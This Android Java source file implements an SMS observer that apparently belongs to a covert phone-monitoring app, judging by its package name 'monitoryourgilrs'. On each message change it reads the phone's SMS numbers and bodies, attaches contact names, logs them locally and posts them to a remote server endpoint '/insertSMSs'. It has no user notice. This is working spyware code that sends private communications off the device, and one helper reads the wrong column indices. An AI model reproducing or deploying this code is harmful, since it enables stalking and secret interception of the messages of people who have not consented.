package sms.log;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import call.log.ContactInfo;

import java.util.Map;

import Beans.ResponseBean;
import utils.SetUtil;
import utils.VolleyUtils;

import static utils.TimeUtils.dateToString;

public class SmsContentObserver extends ContentObserver {
    private static final int MY_PERMISSIONS_REQUEST_READ_EXTERNAL_STORAGE = 200;
    /**
     * Creates a content observer.
     *
     * @param handler The handler to run {@link #onChange} on, or null if none.
     */
    private Context myContext;
    private static final String TAG = "SMSTRACKER";
    private static final Uri SMSUri = Uri.parse("content://sms");
    private int result;
    final private int REQUEST_CODE_ASK_PERMISSIONS = 200;
    final private  String SMSURL = VolleyUtils.IP + "/insertSMSs";
    private  SQLiteDatabase db ;


    public SmsContentObserver(Handler handler,Context context) {
        super(handler);
        myContext = context;
    }
    @Override
    public boolean deliverSelfNotifications()
    {
        // TODO Auto-generated method stub
        return true;
    }
    @Override
    public void onChange(boolean selfChange, Uri uri)
    {
        // TODO Auto-generated method stub
        super.onChange(selfChange);
        Log.i(TAG,uri.toString());
        if ("content://sms/raw/".length() >= uri.toString().length()) { //过滤掉阅读后的 content://sms等等
            return;
        }
        Log.i(TAG,"SMSObserverActivated");

        storeData();

//        dispDatabase();

    }

    private void storeData(){
        final com.dk.monitoryourgilrs.DbHelper dh = com.dk.monitoryourgilrs.DbHelper.getInstance(myContext);
        db = dh.getWritableDatabase();
    //通过ContentResolver对象查询系统短信
        ContentResolver resolver = myContext.getContentResolver();
        String[] column = {"_id","address","date","type","body"};
        Cursor cursor = resolver.query(SMSUri, column, null, null, null);
        final ContentValues values=new ContentValues();
        final long IMEI = 00001;
        Log.v(TAG, String.valueOf(cursor.getCount()));
        while (cursor.moveToNext()) {
            values.put("_id",System.currentTimeMillis());
            values.put("imei", IMEI);
            values.put("number",cursor.getString(1));
            values.put("date",dateToString(cursor.getLong(2)));
            values.put("type",cursor.getInt(3));
            values.put("body",cursor.getString(4));
            values.put("updateServer",-1);
            Log.v(TAG, "number: " + cursor.getString(1) + " content: " + cursor.getString(4));
            db.insert("smslog", null, values);
            break;
        }
        cursor.close();
        final Cursor data = db.rawQuery("select * from smslog ORDER BY date DESC", null);
        System.out.println("dbcount: " + data.getCount());
        ContactInfo contactInfo  = new ContactInfo(myContext);
        while (data.moveToNext()) {
            int updateServer = data.getInt(7 );
            System.out.println("updateServer: " + updateServer);
            if(updateServer == -1){
                final long _id = data.getLong(0);
                values.put("_id", _id);
                values.put("imei",data.getInt(1));
                values.put("name",contactInfo.getConName(new String[]{data.getString(3)}));  //姓名
                values.put("number",data.getString(3));  //号码
                values.put("date", data.getString(4)); //获取通话日期
                values.put("type",data.getInt(5)); //获取通话类型：1.呼入2.呼出3.未接
                values.put("body", data.getString(6)); //获取短信内容
                values.put("updateServer",1);

                //to do update server
                if (utils.NetWorkUtils.isNetworkConnected(myContext)) {
                    Log.v(TAG, "NetWork ok !");

                    VolleyUtils.create(myContext)
                            .post(SMSURL, ResponseBean.class, new VolleyUtils.OnResponse<ResponseBean>() {
                                @Override
                                public void OnMap(Map<String, String> map) {
                                    map.put("_id", values.getAsString("_id"));
                                    map.put("imei", values.getAsString("imei"));
                                    map.put("name", values.getAsString("name"));
                                    map.put("number", values.getAsString("number"));
                                    map.put("date", values.getAsString("date"));
                                    map.put("type", values.getAsString("type"));
                                    map.put("body", values.getAsString("body"));
                                }

                                @Override
                                public void onSuccess(ResponseBean response) {
                                    Log.e(TAG, "response---->" + response);
                                    db.update("smslog",values,"_id = ?", new String[]{String.valueOf(_id)});
                                }

                                @Override
                                public void onError(String error) {
                                    Log.e(TAG, "error---->" + error);
                                }
                            });
                }else{
                    Log.v(TAG, "NetWork not ok !");
                }
            }
        }
        data.close();
    }

    private void dispDatabase(){
        //通过ContentResolver对象查询系统短信
        ContentResolver resolver = myContext.getContentResolver();
        String[] column = {"_id","thread_id","address","date","read","status","type","body","seen"};
        Cursor cursor = resolver.query(SMSUri, column, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                int _id = cursor.getInt(0);
                String address = cursor.getString(2);
                int type = cursor.getInt(2);
                String body = cursor.getString(3);
                long date = cursor.getLong(4);
                Log.v(TAG, "number: " + address + " content: " + body );
            }
            cursor.close();
        }
    }

}

